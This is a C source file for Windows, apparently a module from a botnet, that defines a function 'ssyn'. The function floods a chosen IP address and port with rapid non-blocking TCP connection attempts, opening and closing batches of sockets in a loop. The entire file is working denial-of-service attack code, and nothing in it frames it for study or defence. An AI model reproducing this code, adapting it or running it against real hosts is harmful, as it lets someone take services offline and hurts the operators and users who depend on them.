#include "includes.h"
#include "externs.h"

void ssyn(char *target, char *port, char *len)
{
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(len);

	int skydelay = 100;
	SOCKADDR_IN    pocket;
	SOCKET         cookie[S];
   	IN_ADDR iaddr;
	memset(&pocket, 0, sizeof(pocket));
	pocket.sin_family = AF_INET;
   	pocket.sin_port = htons(p);
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	int c,i;
	iaddr.s_addr = inet_addr(target);
	pocket.sin_addr = iaddr; //ip addy
	i = 0;
	while (i < t)
	{
		for (c=0;c<S;c++)
		{
			cookie[c] = socket(AF_INET, SOCK_STREAM, 0);
			if (cookie[c] == INVALID_SOCKET)
				goto bottom;
			ioctlsocket(cookie[c],FIONBIO,&mode);
		}
		for (c=0;c<S;c++)
		{
				connect(cookie[c], (PSOCKADDR) &pocket, sizeof(pocket));
		}
		for (c=0;c<S;c++)
			closesocket(cookie[c]); //close sockets
		i++;
	}bottom:;

	Sleep( 500 );
};